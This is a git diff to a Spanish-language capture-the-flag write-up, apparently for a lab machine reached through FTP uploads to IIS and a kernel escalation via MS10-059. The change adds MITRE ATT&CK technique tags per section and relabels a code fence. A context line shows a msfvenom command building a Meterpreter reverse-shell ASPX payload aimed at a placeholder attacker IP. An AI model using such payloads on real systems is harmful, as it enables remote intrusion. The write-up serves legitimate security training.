@@ -7,6 +7,15 @@ order: 9
 summary: "Acceso por FTP e IIS y escalada mediante una vulnerabilidad del sistema."
 tags: ["FTP", "IIS", "Kernel"]
 keywords: "devel devel ftp · iis · kernel acceso por ftp e iis y escalada mediante una vulnerabilidad del sistema."
+cadena:
+  - seccion: "El FTP y la web comparten archivos"
+    tecnicas: ["T1595", "T1190", "T1505.003"]
+  - seccion: "Una consola interactiva"
+    tecnicas: ["T1105"]
+  - seccion: "Escalada con MS10-059"
+    tecnicas: ["T1082", "T1068"]
+  - seccion: "Otra forma de recibir la shell"
+    tecnicas: ["T1505.003"]
 ---
 
 ## El FTP y la web comparten archivos
@@ -25,7 +34,7 @@ Ejecuto `systeminfo` y guardo su salida en mi equipo para analizarla con Windows
 
 También podemos aprovechar la subida por FTP para dejar un payload de Meterpreter en formato ASPX:
 
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=MI_IP LPORT=443
 ```
 
